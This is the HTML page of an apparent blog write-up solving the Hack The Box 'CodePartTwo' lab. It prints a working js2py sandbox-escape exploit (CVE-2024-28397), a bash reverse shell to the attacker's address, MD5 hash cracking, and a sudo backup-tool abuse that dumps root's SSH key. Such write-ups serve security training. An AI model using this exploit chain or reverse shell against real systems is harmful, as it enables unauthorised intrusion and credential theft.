@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="/assets/css/style.css" />
+        <link rel="stylesheet" href="/assets/css/writeups/style.css" />
+        <title>CodePartTwo - pwnerguy's shell stuff</title>
+        <!-- <link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg" /> -->
+        <link rel="shortcut icon" href="/assets/favicons/favicon.ico" />
+        <!-- <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicons/site.webmanifest" /> -->
+        <meta name="apple-mobile-web-app-title" content="pwnerguy's shell stuff" />
+        <!-- SEO -->
+        <meta name="description" content="pwnerguy's shell stuff is an offensive cybersecurity blog focused on solving practical labs from the Hack The Box, TryHackMe and VulnHub platforms." />
+        <meta name="keywords" content="pwnerguy, Rubén Martos, ethical hacking, ethical hacker, penetration testing, pentesting, offensive cybersecurity, cybersecurity, Hack The Box, TryHackMe, VulnHub, SysAdmin, Linux, Windows, writeups, projects, portfolio, pwnerguy.github.io" />
+        <meta name="author" content="pwnerguy" />
+        <meta name="robots" content="index, follow" />
+    </head>
+    <body>
+        <header>
+            <a href="/" class="logo">pwnerguy's shell stuff</a>
+            <nav>
+                <a href="/writeups">Writeups</a>
+                <a href="/cheatsheets">Cheat Sheets</a>
+            </nav>
+        </header>
+        <main>
+            
+        <a href="/writeups" class="back-link">← Go back</a>
+        <section class="writeup-content">
+            <h1>CodePartTwo</h1>
+<div class="writeup-tags"><span class="tag tag-hack-the-box">Hack The Box</span> <span class="tag tag-easy">Easy</span> <span class="tag tag-linux">Linux</span> <span class="tag tag-js2py-rce">js2py RCE</span> <span class="tag tag-rce">RCE</span> <span class="tag tag-hash-cracking">Hash Cracking</span> <span class="tag tag-sudo">Sudo</span></div>
+<hr>
+<h2>Introduction</h2>
+<p>This writeup documents the penetration testing of the <a href="https://app.hackthebox.com/machines/CodePartTwo"><strong>CodePartTwo</strong></a> machine from the <a href="https://www.hackthebox.com/"><strong>Hack The Box</strong></a> platform. In this case, I&#39;ll exploit a vulnerable Python library called <strong>js2py</strong> to get a RCE and privesc by abussing a backup script.</p>
+<hr>
+<h2>Information Gathering</h2>
+<p>After identifying the target&#39;s IP address and operating system of the machine, we need to enumerate as  much information as possible about the host.</p>
+<pre><code>❯ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.129.16.47 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-04 15:12 +0100
+Initiating SYN Stealth Scan at 15:12
+Scanning 10.129.16.47 [65535 ports]
+Discovered open port 22/tcp on 10.129.16.47
+Discovered open port 8000/tcp on 10.129.16.47
+Completed SYN Stealth Scan at 15:12, 11.58s elapsed (65535 total ports)
+Nmap scan report for 10.129.16.47
+Host is up, received user-set (0.075s latency).
+Scanned at 2026-02-04 15:12:12 CET for 11s
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE  REASON
+22/tcp   open  ssh      syn-ack ttl 63
+8000/tcp open  http-alt syn-ack ttl 63
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 11.69 seconds
+           Raw packets sent: 65537 (2.884MB) | Rcvd: 65537 (2.621MB)
+</code></pre>
+<pre><code>❯ nmap -sCV -p22,8000 10.129.16.47 -oN targeted
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-04 15:12 +0100
+Nmap scan report for 10.129.16.47
+Host is up (0.040s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
+|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
+|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
+8000/tcp open  http    Gunicorn 20.0.4
+|_http-title: Welcome to CodePartTwo
+|_http-server-header: gunicorn/20.0.4
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
+</code></pre>
+<p>Nmap found 2 open ports. The intrusion is probably going to be, or at least start, from port 8000. You can Google the SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s <a href="https://pwnerguy.github.io/enumeration-cheatsheet/">Enumeration Cheat Sheet</a>, which includes a table mapping service versions to possible OS versions. We are facing an <strong>Ubuntu Focal (20.04)</strong></p>
+<p>We can&#39;t do much with the SSH service since we don&#39;t have credentials yet, so let&#39;s focus on the HTTP port.</p>
+<pre><code>❯ whatweb http://10.129.16.47:8000
+http://10.129.16.47:8000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn/20.0.4], IP[10.129.16.47], Script, Title[Welcome to CodePartTwo]
+</code></pre>
+<p><img src="/assets/images/codeparttwo/web.png" alt=""></p>
+<p>There are 3 buttons redirecting to <code>/login</code>, <code>/register</code> and <code>/download</code>. I fuzzed directories but nothing interesting...</p>
+<pre><code>❯ gobuster dir -u http://10.129.16.47:8000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.16.47:8000
+[+] Method:                  GET
+[+] Threads:                 30
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/download             (Status: 200) [Size: 10708]
+/login                (Status: 200) [Size: 667]
+/register             (Status: 200) [Size: 651]
+/logout               (Status: 302) [Size: 189] [--&gt; /]
+/dashboard            (Status: 302) [Size: 199] [--&gt; /login]
+Progress: 220557 / 220557 (100.00%)
+===============================================================
+Finished
+===============================================================
+</code></pre>
+<p>When I clicked on the <code>DOWNLOAD APP</code> button, it downloaded <code>app.zip</code>, containing: </p>
+<pre><code>Archive:  app.zip
+   creating: app/
+   creating: app/static/
+   creating: app/static/css/
+  inflating: app/static/css/styles.css  
+   creating: app/static/js/
+  inflating: app/static/js/script.js  
+  inflating: app/app.py              
+   creating: app/templates/
+  inflating: app/templates/dashboard.html  
+  inflating: app/templates/reviews.html  
+  inflating: app/templates/index.html  
+  inflating: app/templates/base.html  
+  inflating: app/templates/register.html  
+  inflating: app/templates/login.html  
+  inflating: app/requirements.txt    
+   creating: app/instance/
+  inflating: app/instance/users.db  
+</code></pre>
+<p>The <code>requirements.txt</code> contains the versions of the app&#39;s frameworks.</p>
+<pre><code>❯ cat requirements.txt
+flask==3.0.3
+flask-sqlalchemy==3.1.1
+js2py==0.74
+</code></pre>
+<blockquote>
+<p><strong>Js2Py</strong> is a Python library that is able to translate and execute virtually any JavaScript code written in pure Python and does not have any dependencies.</p>
+</blockquote>
+<p>In fact, <code>app.zip</code> is the whole web compressed in a ZIP file, but I couldn&#39;t find more stuff since it&#39;s empty. When you register and log in, there is a JS code manager.</p>
+<p><img src="/assets/images/codeparttwo/js.png" alt=""></p>
+<hr>
+<h2>Vulnerability Assessment</h2>
+<p><strong>CVE-2024-28397</strong> corresponds to the sandbox escape vuln in this Python library. The vuln is docummented in <strong><a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape?tab=readme-ov-file">this repo</a></strong>, but I&#39;ll make it simple here.  Basically, there&#39;s a vulnerability that consists on executing JS code to escape the sandbox of the Python library <code>js2py</code> and getting a RCE in the server, so let&#39;s try to exploit this vuln.</p>
+<hr>
+<h2>Exploitation</h2>
+<p>I&#39;ll execute this code while I&#39;m capturing traffic with Wireshark to perform a quick test.</p>
+<pre><code class="language-js">let cmd = &quot;ping -c 1 10.10.17.188&quot;
+let hacked, bymarve, n11
+let getattr, obj
+
+hacked = Object.getOwnPropertyNames({})
+bymarve = hacked.__getattribute__
+n11 = bymarve(&quot;__getattribute__&quot;)
+obj = n11(&quot;__class__&quot;).__base__
+getattr = obj.__getattribute__
+
+function findpopen(o) {
+    let result;
+    for(let i in o.__subclasses__()) {
+        let item = o.__subclasses__()[i]
+        if(item.__module__ == &quot;subprocess&quot; &amp;&amp; item.__name__ == &quot;Popen&quot;) {
+            return item
+        }
+        if(item.__name__ != &quot;type&quot; &amp;&amp; (result = findpopen(item))) {
+            return result
+        }
+    }
+}
+
+n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
+console.log(n11)
+n11
+</code></pre>
+<p><img src="/assets/images/codeparttwo/wireshark.png" alt=""></p>
+<p>The victim machine did ping my machine, so I got a RCE. Now, I&#39;ll execute the following command in the server while I&#39;m listening in my machine from the port 4444.</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/10.10.17.188/4444 0&gt;&amp;1
+</code></pre>
+<pre><code>❯ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.17.188] from (UNKNOWN) [10.129.16.47] 55546
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ whoami
+app
+</code></pre>
+<hr>
+<h2>Post-Exploitation</h2>
+<p>Now I&#39;m in the system as the user <code>app</code> and I can try to see again the file <code>users.db</code>.</p>
+<pre><code>app@codeparttwo:~/app/instance$ sqlite3 users.db
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter &quot;.help&quot; for usage hints.
+sqlite&gt; sqlite3
+   ...&gt; ;
+Error: near &quot;sqlite3&quot;: syntax error
+sqlite&gt; .tables
+code_snippet  user        
+sqlite&gt; SELECT * FROM user;
+1|marco|649c9d65a206a75f5abe509fe128bce5
+2|app|a97588c0e2fa3a024876339e27aeb42e
+</code></pre>
+<p>Let&#39;s crack <code>marco</code>&#39;s hash and log in as him.</p>
+<pre><code>❯ john --format=Raw-MD5 -w:/usr/share/wordlists/rockyou.txt hash1
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=5
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+sweetangelbabylove (?)     
+1g 0:00:00:00 DONE (2026-02-04 18:17) 2.500g/s 8621Kp/s 8621Kc/s 8621KC/s sweetbabygyal..sweetali786
+Use the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+<p><code>marco</code> can run the binary <code>/usr/local/bin/npbackup-cli</code> as root without providing credentials.</p>
+<pre><code>marco@codeparttwo:~$ sudo -l
+Matching Defaults entries for marco on codeparttwo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User marco may run the following commands on codeparttwo:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+</code></pre>
+<p>The backup path is defined in <code>npbackup.conf</code>, which is located in <code>marco</code>&#39;s home directory.</p>
+<p><img src="/assets/images/codeparttwo/backup_path.png" alt=""></p>
+<p>Using parameters from the <code>--help</code> output of the binary, I&#39;ll duplicate npbackup.conf so that it&#39;s writeable by <code>marco</code> and then, edit the backup path to backup the hole <code>/root</code> directory.</p>
+<pre><code>marco@codeparttwo:~$ cp npbackup.conf npbackup_pwn.conf
+marco@codeparttwo:~$ ls -l
+total 16
+drwx------ 7 root  root  4096 Apr  6  2025 backups
+-rw-rw-r-- 1 root  root  2893 Jun 18  2025 npbackup.conf
+-rw-rw-r-- 1 marco marco 2893 Feb  4 17:45 npbackup_pwn.conf
+-rw-r----- 1 root  marco   33 Feb  4 13:19 user.txt
+marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_pwn.conf -b
+...
+2026-02-04 17:50:53,376 :: INFO :: Operation finished
+2026-02-04 17:50:53,382 :: INFO :: ExecTime = 0:00:02.214257, finished, state is: errors.
+</code></pre>
+<p>Once finised, I listed the files and directories of the backup and thought on using root&#39;s private key to access the system via SSH.</p>
+<pre><code>marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_pwn.conf --ls
+...
+/root/.ssh/id_rsa
+...
+marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_pwn.conf --dump /root/.ssh/id_rsa
+...
+</code></pre>
+<pre><code>❯ chmod 600 id_rsa
+❯ ssh -i id_rsa root@10.129.16.47
+...
+root@codeparttwo:~# cat root.txt
+***REDACTED***
+</code></pre>
+
+        </section>
+    
+        </main>
+        <footer>
+            <p>© 2026 <strong>pwnerguy's shell stuff</strong></p>
+            <div class="icons">
+                <a href="mailto:rmp.it@proton.me" target="_blank"">
+                    <svg class="svg-inline--fa fa-envelope-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="envelope-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM178.117 262.104C87.429 196.287 88.353 196.121 64 177.167V152c0-13.255 10.745-24 24-24h272c13.255 0 24 10.745 24 24v25.167c-24.371 18.969-23.434 19.124-114.117 84.938-10.5 7.655-31.392 26.12-45.883 25.894-14.503.218-35.367-18.227-45.883-25.895zM384 217.775V360c0 13.255-10.745 24-24 24H88c-13.255 0-24-10.745-24-24V217.775c13.958 10.794 33.329 25.236 95.303 70.214 14.162 10.341 37.975 32.145 64.694 32.01 26.887.134 51.037-22.041 64.72-32.025 61.958-44.965 81.325-59.406 95.283-70.199z"></path></svg>
+                </a>
+                <a href="https://www.linkedin.com/in/r-mar" target="_blank">
+                    <svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>
+                </a>
+                <a href="https://github.com/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg>
+                </a>
+                <a href="https://tryhackme.com/p/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-user-secret fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-secret" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M383.9 308.3l23.9-62.6c4-10.5-3.7-21.7-15-21.7h-58.5c11-18.9 17.8-40.6 17.8-64v-.3c39.2-7.8 64-19.1 64-31.7 0-13.3-27.3-25.1-70.1-33-9.2-32.8-27-65.8-40.6-82.8-9.5-11.9-25.9-15.6-39.5-8.8l-27.6 13.8c-9 4.5-19.6 4.5-28.6 0L182.1 3.4c-13.6-6.8-30-3.1-39.5 8.8-13.5 17-31.4 50-40.6 82.8-42.7 7.9-70 19.7-70 33 0 12.6 24.8 23.9 64 31.7v.3c0 23.4 6.8 45.1 17.8 64H56.3c-11.5 0-19.2 11.7-14.7 22.3l25.8 60.2C27.3 329.8 0 372.7 0 422.4v44.8C0 491.9 20.1 512 44.8 512h358.4c24.7 0 44.8-20.1 44.8-44.8v-44.8c0-48.4-25.8-90.4-64.1-114.1zM176 480l-41.6-192 49.6 32 24 40-32 120zm96 0l-32-120 24-40 49.6-32L272 480zm41.7-298.5c-3.9 11.9-7 24.6-16.5 33.4-10.1 9.3-48 22.4-64-25-2.8-8.4-15.4-8.4-18.3 0-17 50.2-56 32.4-64 25-9.5-8.8-12.7-21.5-16.5-33.4-.8-2.5-6.3-5.7-6.3-5.8v-10.8c28.3 3.6 61 5.8 96 5.8s67.7-2.1 96-5.8v10.8c-.1.1-5.6 3.2-6.4 5.8z"></path></svg>
+                </a>
+                <a href="https://app.hackthebox.com/users/3026377" target="_blank" rel="noopener">
+                    <svg class="svg-inline--fa fa fa-cube" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="fa-cube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M239.1 6.3l-208 78c-18.7 7-31.1 25-31.1 45v225.1c0 18.2 10.3 34.8 26.5 42.9l208 104c13.5 6.8 29.4 6.8 42.9 0l208-104c16.3-8.1 26.5-24.8 26.5-42.9V129.3c0-20-12.4-37.9-31.1-44.9l-208-78C262 2.2 250 2.2 239.1 6.3zM256 68.4l192 72v1.1l-192 78-192-78v-1.1l192-72zm32 356V275.5l160-65v133.9l-160 80z"></path></svg>
+                </a>
+            </div>
+        </footer>
+        <script>
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const q = searchInput.value.toLowerCase();
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`;
+            //             if (haystack.includes(q)) {
+            //                 card.classList.remove("hidden");
+            //             } else {
+            //                 card.classList.add("hidden");
+            //             }
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+            document.querySelectorAll('a[href^="http"]').forEach(a => {
+                a.setAttribute("target", "_blank");
+                a.setAttribute("rel", "noopener noreferrer");
+            });
+            });
+
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const terms = searchInput.value
+            //             .toLowerCase()
+            //             .trim()
+            //             .split(/\s+/);
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+            //             const matches = terms.every(t => haystack.includes(t));
+            //             card.classList.toggle("hidden", !matches);
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+                const cards = document.querySelectorAll('.writeup-card');
+                const searchInput = document.getElementById('searchInput');
+                const resultsCount = document.getElementById('resultsCount');
+
+                function updateCount() {
+                    const visible = document.querySelectorAll(".writeup-card:not(.hidden)").length;
+                    if (resultsCount) {
+                        resultsCount.textContent = `${visible} available machines`;
+                    }
+                }
+
+                if (!searchInput) return;
+
+                searchInput.addEventListener('input', () => {
+                    const terms = searchInput.value
+                        .toLowerCase()
+                        .trim()
+                        .split(/\s+/);
+
+                    cards.forEach(card => {
+                        const categories = (card.dataset.categories || "").toLowerCase();
+                        const title = card.querySelector("h2").textContent.toLowerCase();
+                        const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+
+                        const matches = terms.every(t => haystack.includes(t));
+                        card.classList.toggle("hidden", !matches);
+                    });
+
+                    updateCount();
+                });
+
+                updateCount();
+            });
+
+        </script>
+    </body>
+</html>
